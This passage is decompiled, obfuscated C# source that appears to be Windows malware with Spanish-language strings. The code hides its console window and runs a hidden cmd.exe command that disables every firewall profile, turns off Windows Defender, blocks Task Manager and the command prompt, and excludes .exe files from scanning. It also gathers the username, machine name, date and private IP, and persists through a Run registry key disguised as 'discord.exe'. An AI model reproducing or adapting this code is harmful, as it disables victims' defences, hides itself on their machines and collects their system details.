					((Control)Program.text).set_Text("ID: " + ID + " enter nombre de usuario: " + Environment.UserName + " enter nombre de PC: " + Environment.MachineName + " enter fecha: " + DateTime.UtcNow.ToString() + "enter ip privada: " + DsQqYUXMkSfYUhmvvtwYmI() + " enter lines-");
					jhsZYjgPhjeUTODAInHrCR();
				}
				else
				{
					text2 = "no";
				}
				password = "";
			}
			string text3 = "si";
			string text4 = text3;
			if (text4 == text3)
			{
				qwlSOnEkkzRcLkGyCOSapa(3000);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.StackTrace);
		}
	}

	private static void Main(string[] args)
	{
		//IL_0202: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			_ = Process.GetCurrentProcess().MainWindowHandle;
			IntPtr consoleWindow = GetConsoleWindow();
			ShowWindow(consoleWindow, 0);
			if ("".Contains(Thread.CurrentThread.CurrentUICulture.Name))
			{
				Environment.Exit(1);
				Application.Exit();
			}
			new Program();
			string text = "si";
			if (text == "si")
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = "cmd.exe";
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.Arguments = "/c netsh advfirewall set allprofiles state off & netsh advfirewall set currentprofile state off & netsh advfirewall set domainprofile state off & netsh advfirewall set privateprofile state off & netsh advfirewall set publicprofile state off & REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v \"DisableAntiSpyware\" /t REG_DWORD /d 1 /f & REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f & REG ADD HKCU\\Software\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 2 /f & powershell -Command Add-MpPreference -ExclusionExtension .exe";
				Process.Start(processStartInfo);
			}
			Thread.Sleep(300000);
			string text2 = "no";
			string text3 = "no";
			DateTime.Parse("18/8/2022", CultureInfo.CreateSpecificCulture("es-ES"));
			string text4 = (DateTime.UtcNow.Date - DateTime.UtcNow.Date).ToString();
			while (text3 == "no")
			{
				while (((text4 == "00:00:00") & (text2 == "no")) | (text4.Contains("-") & (text2 == "no")))
				{
					text2 = "si";
					text3 = "si";
					string text5 = "no";
					string text6 = "si";
					string text7 = "si";
					string text8 = "no";
					if (text6 == "no")
					{
						Program program = new Program();
						program.start();
					}
					else
					{
						if (!(text6 == "si"))
						{
							continue;
						}
						while (text5 == "no")
						{
							if (NetworkInterface.GetIsNetworkAvailable())
							{
								text5 = "si";
								Program program = new Program();
								program.start();
							}
							else if (text7 == "si" && text8 == "no")
							{
								text8 = "si";
								RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
								registryKey.SetValue("discord", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe");
								string keyName = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
								string valueName = "discord";
								if (Registry.GetValue(keyName, valueName, null) == null)
								{
									MessageBox.Show("error", "error", (MessageBoxButtons)0, (MessageBoxIcon)16);
								}
							}
						}
					}
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}
}
